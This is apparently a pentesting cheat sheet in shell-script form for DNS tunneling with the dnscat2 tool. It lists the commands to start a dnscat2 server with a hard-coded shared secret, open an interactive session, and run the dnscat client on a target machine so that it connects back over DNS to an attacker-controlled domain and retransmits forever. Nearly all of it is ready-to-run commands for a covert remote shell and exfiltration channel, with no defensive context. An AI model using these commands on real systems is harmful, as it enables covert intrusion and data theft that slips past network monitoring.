#!/bin/sh

## --------------------------------------------- ##
##   [?] DNSCat - Pentesting - DNS Tunneling
## --------------------------------------------- ##



dnscat2.rb 
dnscat2> New session established: 1422 
dnscat2> session -i 1422


## ------------------------- ##
##   [?] Target Machine:
## ------------------------- ##
dnscat --host $ServerIP



##-==================================-##
##   [+] Start the dnscat2 Server
##-==================================-##
dnscat2.rb --security=authenticated --secret=12viFdfMonso3dF $Domain



##-=================================-##
##   [+] Start the dnscat2 Client
##-=================================-##
dnscat --retransmit-forever --secret=12viFdfMonso3dF $Domain


